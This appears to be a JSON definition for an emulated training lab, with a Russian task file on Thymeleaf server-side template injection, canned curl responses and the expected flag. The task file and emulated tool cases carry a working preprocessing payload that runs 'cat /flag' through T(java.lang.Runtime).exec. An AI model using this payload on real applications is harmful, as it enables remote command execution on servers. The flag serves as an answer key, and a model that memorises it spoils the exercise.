@@ -1,0 +1,42 @@
+{
+  "id": "web-thymeleaf",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{thym3l34f_pr3pr0c3ss_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Thymeleaf SSTI\n\nЭндпоинт /render подставляет tpl в шаблон Thymeleaf.\nДойди от preprocessing-выражения до исполнения команды и прочитай флаг.\n\n1. Подтверди движок и preprocessing:\n   curl -s 'https://app.target/render?tpl=%24%7B7*7%7D'\n   curl -s 'https://app.target/render?tpl=__%24%7B7*7%7D__::.x'\n2. Выполни команду чтения флага через T(java.lang.Runtime):\n   curl -s 'https://app.target/render?tpl=__%24%7BT(java.lang.Runtime).getRuntime().exec(%27cat%20/flag%27)%7D__::.x'\n3. Запиши вывод с флагом в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/render)",
+      "cases": [
+        {
+          "match": "__%24%7B7\\*7|__\\$\\{7\\*7",
+          "example": "-s '.../render?tpl=__${7*7}__::.x'",
+          "output": "49\n"
+        },
+        {
+          "match": "%24%7B7\\*7|\\$\\{7\\*7",
+          "example": "-s '.../render?tpl=${7*7}'",
+          "output": "49\n"
+        },
+        {
+          "match": "Runtime|exec",
+          "example": "-s '.../render?tpl=__${T(java.lang.Runtime).getRuntime().exec('cat /flag')}__::.x'",
+          "output": "nto{thym3l34f_pr3pr0c3ss_rce}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /render на app.target.\n"
+    }
+  }
+}
